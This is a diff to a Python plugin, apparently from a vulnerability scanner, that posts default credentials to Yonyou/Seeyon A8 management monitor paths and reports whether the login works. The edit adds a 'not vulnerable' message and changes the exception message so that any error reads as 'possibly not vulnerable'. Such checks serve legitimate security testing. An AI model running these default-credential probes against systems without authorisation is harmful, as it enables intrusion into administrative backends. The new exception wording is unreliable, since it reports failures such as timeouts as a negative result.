@@ -24,14 +24,18 @@ class yonyou_status_default_pwd_BaseVerify:
         payloads = {"/seeyon/management/index.jsp",
                     "/management/index.jsp"}
         try:
+            noexist = True
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
                 if r"A8 Management Monitor" in req.text and r"Connections Stack Trace" in req.text:
                     cprint("[+]存在用友a8监控后台默认密码漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在yonyou_status_default_pwd漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
